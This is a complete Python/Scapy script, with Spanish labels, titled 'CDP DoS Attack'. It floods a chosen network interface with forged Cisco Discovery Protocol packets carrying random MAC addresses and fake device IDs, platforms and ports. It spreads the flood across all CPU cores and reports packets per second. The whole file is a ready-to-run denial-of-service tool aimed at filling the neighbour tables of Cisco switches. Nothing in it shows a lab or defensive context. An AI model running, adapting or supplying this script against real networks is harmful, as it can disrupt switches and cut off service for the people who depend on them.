#!/usr/bin/env python3

#########################################################
# Ataque:  CDP DoS
# Autor:   Luiggy Encarnacion
#########################################################

from scapy.all import *
from scapy.contrib.cdp import *

import random
import signal
import sys
import multiprocessing
import time

BATCH_SIZE  = 100
NUM_WORKERS = multiprocessing.cpu_count()

# ─────────────────────────────────────────
def banner(title):
    width = 40
    print()
    print("  ╔" + "═" * width + "╗")
    print("  ║" + title.center(width) + "║")
    print("  ╚" + "═" * width + "╝")

# ─────────────────────────────────────────
def select_interface():
    try:
        from scapy.all import get_if_list
        interfaces = get_if_list()
    except Exception:
        interfaces = []

    if not interfaces:
        print("  [!] No se detectaron interfaces de red.")
        iface = input("  Ingrese el nombre de la interfaz manualmente: ").strip()
        return iface

    print()
    print("  Interfaces de red disponibles:")
    for i, iface in enumerate(interfaces, 1):
        print(f"    [{i}] {iface}")
    print()

    while True:
        seleccion = input("  Seleccione interfaz (número o nombre): ").strip()
        if seleccion.isdigit():
            idx = int(seleccion) - 1
            if 0 <= idx < len(interfaces):
                return interfaces[idx]
            else:
                print("  [!] Número fuera de rango. Intente de nuevo.")
        elif seleccion in interfaces:
            return seleccion
        else:
            print("  [!] Interfaz no válida. Intente de nuevo.")

def solicitar_parametros():
    banner("CDP DoS Attack")
    print()

    try:
        iface = select_interface()
        print()
    except KeyboardInterrupt:
        print()
        print("  [!] Saliendo.")
        sys.exit(0)

    return iface

# ─────────────────────────────────────────
def random_mac():
    return ':'.join([f'{random.randint(0,255):02x}' for _ in range(6)])

def build_cdp_packet():
    device_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))
    return (
        Ether(src=random_mac(), dst="01:00:0c:cc:cc:cc") /
        LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
        SNAP(OUI=0x00000c, code=0x2000) /
        CDPv2_HDR(vers=2, ttl=180) /
        CDPMsgDeviceID(val=device_id) /
        CDPMsgSoftwareVersion(val=f"Cisco IOS Version 12.{random.randint(0,4)}.{random.randint(0,9)}") /
        CDPMsgPlatform(val=random.choice([
            "cisco WS-C3750", "cisco WS-C2960", "cisco CISCO2911/K9",
            "cisco WS-C4507R", "cisco WS-C6509"
        ])) /
        CDPMsgCapabilities(cap=random.randint(0x01, 0xFF)) /
        CDPMsgPortID(iface=f"GigabitEthernet0/{random.randint(0,48)}")
    )

def worker(counter, iface):
    while True:
        batch = [build_cdp_packet() for _ in range(BATCH_SIZE)]
        sendp(batch, iface=iface, verbose=False)
        with counter.get_lock():
            counter.value += BATCH_SIZE

def monitor(counter, start_time):
    prev = 0
    header = f"  {'Tiempo':^8} {'Total':^12} {'Rate':^14} {'Workers':^10}"
    sep    = "  " + "─" * (len(header) - 2)
    print(header)
    print(sep)
    while True:
        time.sleep(5)
        current = counter.value
        rate = (current - prev) // 5
        elapsed = int(time.time() - start_time.value)
        prev = current
        mins, secs = divmod(elapsed, 60)
        print(f"  {mins:02d}:{secs:02d}   {current:>10,}   {rate:>6,} pkt/s   {NUM_WORKERS:>4} cores")

# ─────────────────────────────────────────
def main():
    IFACE = solicitar_parametros()

    banner("CDP DoS Attack")
    print(f"  Interfaz : {IFACE}")
    print(f"  Workers  : {NUM_WORKERS} cores")
    print(f"  Batch    : {BATCH_SIZE} pkt/worker")
    print()

    counter    = multiprocessing.Value('i', 0)
    start_time = multiprocessing.Value('d', time.time())

    processes = []
    for _ in range(NUM_WORKERS):
        p = multiprocessing.Process(target=worker, args=(counter, IFACE), daemon=True)
        p.start()
        processes.append(p)

    mon = multiprocessing.Process(target=monitor, args=(counter, start_time), daemon=True)
    mon.start()

    try:
        for p in processes:
            p.join()
    except KeyboardInterrupt:
        total   = counter.value
        elapsed = max(int(time.time() - start_time.value), 1)
        avg     = total // elapsed

        print()
        banner("Resumen Final")
        print(f"  Paquetes enviados : {total:,}")
        print(f"  Rate promedio     : {avg:,} pkt/s")
        print()

        for p in processes:
            p.terminate()
        mon.terminate()
        sys.exit(0)

if __name__ == "__main__":
    main()
